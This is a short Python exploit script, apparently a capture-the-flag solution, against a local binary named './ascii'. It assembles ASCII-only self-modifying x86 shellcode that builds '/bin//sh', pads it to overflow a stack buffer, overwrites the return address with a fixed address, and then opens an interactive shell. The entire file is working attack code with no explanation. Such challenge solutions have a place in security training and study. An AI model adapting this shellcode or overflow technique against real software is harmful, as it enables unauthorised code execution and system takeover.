#!/usr/bin/env python
# coding:utf-8

from ctf import *


ret_addr = 0x55557b29

io = process('./ascii')
#io = debug('./ascii')
#io.sendlines('''
#b *0x08048F0D
#b *0x80000000
#r
#'''.strip().split('\n'))

sc = 'dec esp\n' * 4
sc += '''
pop ebx
push 0x20
pop eax
'''
sc += 'dec eax\n' * (0x20 - 0xb)
sc += '''
push eax
pop ecx
'''
sc += 'dec ecx\n' * 0xb
sc += '''
push ecx
pop ebp
push 0x7f
pop edx
inc edx
xor BYTE PTR [ebx + ebp * 2 + 0x70], dl
xor BYTE PTR [ebx + ebp * 2 + 0x71], dl
push 0x4d
pop edx
xor BYTE PTR [ebx + ebp * 2 + 0x71], dl

push ecx
pop edx
push edx
push 0x68732f2f
push 0x6e69622f
push esp
pop ebx
'''
payload = asm(sc)
log.info('raw payload length: %d', len(payload))
payload = payload.ljust(0x70, asm('inc edi'))
payload += '\x4d\x4d'
payload = payload.ljust(0xa8 + 4, 'A')

payload += p32(ret_addr) * 11
payload += '\x00'

io.send(payload)
io.interactive()